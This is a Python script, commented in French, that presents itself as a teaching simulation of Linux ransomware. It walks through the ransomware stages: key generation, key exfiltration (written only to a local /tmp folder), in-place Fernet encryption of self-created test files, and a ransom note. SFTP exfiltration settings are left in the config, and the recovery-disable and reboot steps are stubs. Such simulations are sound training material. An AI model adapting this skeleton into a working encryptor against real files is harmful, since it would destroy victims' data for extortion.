#!/usr/bin/env python3
# ransomware_total.py - Simulation pédagogique de ransomware Linux

import os
import sys
import logging
from cryptography.fernet import Fernet
import paramiko
import socket
import subprocess
from datetime import datetime

# Configuration - MODIFIÉ pour environnement de test
LOG_FILE = "/tmp/ransomware_sim.log"  # Changé vers /tmp pour éviter /var/log
SFTP_SERVER = "192.168.239.130"  # LAISSER VIDE pour la simulation
SFTP_USER = "test"
SFTP_PASS = "test"
SFTP_PORT = 22
SFTP_REMOTE_PATH = "/tmp/exfil_keys"  # Chemin temporaire
RANSOM_NOTE = "/tmp/README_SIMULATION.txt"  # Changé vers /tmp

# Setup logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)


def safety_checks():
    """Nouvelles vérifications de sécurité"""
    # Empêche l'exécution sur de vrais systèmes
    forbidden_paths = ['/home', '/etc', '/bin', '/usr']
    for path in forbidden_paths:
        if os.path.exists(path):
            logging.critical(f"Tentative d'exécution sur un vrai système! Chemin interdit détecté: {path}")
            sys.exit(1)

    # Demande de confirmation
    print("""
    ⚠️ ATTENTION - SIMULATION UNIQUEMENT ⚠️
    Ce script est une simulation pédagogique de ransomware.
    Il NE DOIT PAS être exécuté sur un système réel.

    Appuyez sur Ctrl+C pour annuler maintenant.
    """)
    confirmation = input("Pour continuer la simulation, tapez 'SIMULATION': ")
    if confirmation != "SIMULATION":
        sys.exit(0)


def check_root():
    """Vérifie que le script est exécuté en root"""
    if os.geteuid() != 0:
        logging.error("Le script doit être exécuté en tant que root!")
        sys.exit(1)


def generate_key():
    """Génère une clé de chiffrement Fernet"""
    try:
        key = Fernet.generate_key()
        logging.info(f"Clé générée: {key.decode()}")
        return key
    except Exception as e:
        logging.error(f"Erreur génération clé: {str(e)}")
        sys.exit(1)


def exfiltrate_key(key):
    """Simule l'exfiltration de clé (ne fait rien réellement)"""
    try:
        # Simulation seulement - pas de vraie connexion
        hostname = socket.gethostname()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        remote_filename = f"{hostname}_{timestamp}.key"

        # Écrit localement pour simulation
        os.makedirs("/tmp/simulated_exfil", exist_ok=True)
        with open(f"/tmp/simulated_exfil/{remote_filename}", 'wb') as f:
            f.write(key)

        logging.info(f"SIMULATION: Clé aurait été exfiltrée vers {SFTP_SERVER}/{remote_filename}")
    except Exception as e:
        logging.error(f"Erreur simulation exfiltration: {str(e)}")


def encrypt_file(filepath, fernet):
    """Chiffre un fichier en place - version sécurisée pour tests"""
    try:
        # Ne traite que les fichiers dans /tmp
        if not filepath.startswith('/tmp/'):
            logging.warning(f"Tentative de chiffrement hors zone test: {filepath}")
            return

        if os.path.getsize(filepath) > 10 * 1024 * 1024:  # 10MB max pour les tests
            logging.warning(f"Fichier trop volumineux pour test, ignoré: {filepath}")
            return

        with open(filepath, 'rb') as f:
            data = f.read()

        encrypted_data = fernet.encrypt(data)

        with open(filepath, 'wb') as f:
            f.write(encrypted_data)

        logging.info(f"Fichier chiffré (test): {filepath}")
    except Exception as e:
        logging.warning(f"Échec chiffrement test {filepath}: {str(e)}")


def should_encrypt(path):
    """Détermine si un fichier doit être chiffré - version sécurisée"""
    # Exclusion de tous les chemins sauf /tmp
    if not str(path).startswith('/tmp/'):
        return False

    exclusions = [
        LOG_FILE, RANSOM_NOTE, __file__
    ]

    path_str = str(path)
    return all(excl not in path_str for excl in exclusions)


def encrypt_system(fernet):
    """Parcourt et chiffre le système de fichiers - version test"""
    logging.info("Début simulation chiffrement...")

    # Crée un répertoire de test si inexistant
    test_dir = "/tmp/ransomware_test_files"
    os.makedirs(test_dir, exist_ok=True)

    # Crée quelques fichiers tests
    for i in range(3):
        with open(f"{test_dir}/test_file_{i}.txt", 'w') as f:
            f.write(f"Fichier de test {i}\n" * 100)

    # Chiffre seulement les fichiers de test
    for root, dirs, files in os.walk(test_dir):
        for file in files:
            filepath = os.path.join(root, file)
            if should_encrypt(filepath):
                try:
                    encrypt_file(filepath, fernet)
                except Exception as e:
                    logging.warning(f"Erreur traitement test {filepath}: {str(e)}")


def create_ransom_note(key):
    """Crée une note de simulation"""
    note = f"""
    ⚠️ SIMULATION PÉDAGOGIQUE - PAS DE RANÇON RÉELLE ⚠️

    Ceci est une simulation de ransomware pour formation.
    Aucun fichier réel n'a été chiffré.

    Clé de simulation: {key[:8]}...
    """

    try:
        with open(RANSOM_NOTE, 'w') as f:
            f.write(note)
        logging.info("Note de simulation créée")
    except Exception as e:
        logging.error(f"Erreur création note: {str(e)}")


def simulate_recovery_disable():
    """Simule la désactivation des mécanismes de récupération"""
    logging.info("SIMULATION: Désactivation mécanismes de récupération")
    # Ne fait rien de réel


def simulate_reboot():
    """Simule un redémarrage"""
    logging.info("SIMULATION: Redémarrage simulé")
    # Ne fait rien de réel


def main():
    safety_checks()  # Nouvelle vérification de sécurité
    check_root()
    logging.info("=== DÉBUT SIMULATION RANSOMWARE ===")

    # Étape 1: Génération clé
    key = generate_key()
    fernet = Fernet(key)

    # Étape 2: Simulation exfiltration
    exfiltrate_key(key)

    # Étape 3: Chiffrement test
    encrypt_system(fernet)

    # Étape 4: Simulation désactivation récupération
    simulate_recovery_disable()

    # Étape 5: Note de simulation
    create_ransom_note(key.decode())

    # Étape 6: Simulation redémarrage
    simulate_reboot()

    logging.info("=== FIN SIMULATION ===")
    print("Simulation terminée. Aucun fichier réel n'a été modifié.")
    print(f"Logs disponibles dans {LOG_FILE}")


if __name__ == "__main__":
    main()